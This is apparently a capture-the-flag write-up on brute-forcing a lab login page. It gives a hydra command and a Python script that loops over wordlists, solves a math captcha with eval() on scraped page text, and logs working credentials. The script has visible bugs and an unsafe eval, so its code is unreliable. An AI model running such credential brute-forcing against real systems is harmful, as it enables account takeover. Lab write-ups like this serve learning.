# 🔐 Brute Force Authentication Explained (Step-by-Step) 💥 - Freddy

![alt text](<Screenshot From 2025-04-20 23-45-23.png>)

My first initial thought as soon as I unziped the zip file was its definetly a brute force attack. So I ran the bellow script:

`sudo hydra -L usernames.txt -P passwords.txt 10.10.139.225 http-post-form "/login:username=^USER^&password=^PASS^:Error" -v -t 40`

![alt text](<Screenshot From 2025-04-21 00-24-17.png>)

I was not prepared to wait. I reloaded the website. It presented me with this:

![alt text](<Screenshot From 2025-04-21 00-28-31.png>)

This script tries to brute force login by using the username & password combos to break into a login page that also has a simple math captcha. Here's what it does 👇

---

## 1️⃣ Load Wordlists and the URL

📂 The room provides with a zip file with the users and the passwords txt to brute force with:
- `usernames.txt` ➝ A list of usernames to try
- `passwords.txt` ➝ A list of passwords to try

```
url = 'http://10.10.139.225/login'
usernames = open('usernames.txt', 'r')
passwords = open('passwords.txt', 'r') 
```

Each line is read one at a time.

---

## 2️⃣ Try Every Username

🔁 For each username:
- Clean it up (remove the newline `\n`)
- Go back to the start of the password list (so you can try all passwords again)

```
for username in usernames:
  username = username.strip('\n')
  passwords.seek(0)
```

---

## 3️⃣ Try Every Password

🔁 For each password:
- Also clean it up (remove the newline)
```
for password in passwords:
    password = password.strip('\n')
```

---

## 4️⃣ Solve the Captcha 🤔➕➖✖️

💡 Before sending login data:
- The script **requests the login page**
- It **reads the HTML**
- It finds the **math captcha** (e.g. "5 + 9 =")
- It **solves** the math using Python's `eval()` function

```
session = requests.Session()
    response = session.get(url)
    data = {'username': username,
            'password': password}
    response = session.post(url, data = data)
    soup = BeautifulSoup(response.text, 'html.parser')
    captcha_equation = soup.select_one('label[for="usr"]) + br').next_sibling.strip
    result = eval(captcha_equation.split("=")[0])
```
---

## 5️⃣ Send the Login Attempt 🚀

📝 It builds a form like this:

```
data = {'username': username,
            'password': password,
            'captcha': result}
response = session.post(url, data=data)
```
---

## 6️⃣ Output to the console and to log it✍️ 

```
print("[*] Attempting Password: %s for User: %s" % (password, username))
    if 'does not exist' not in response.text:
        print("[*]Username: %s is valid", username)

        if 'Invalid password' not in response.text:
            print("[*]Password: %s is correct", password)
            log = open('logs.txt', 'w')
            log.write(username +""+ password)
            exit()
        else:
            print("[*]The Password is invalid")
    else:
      break
```
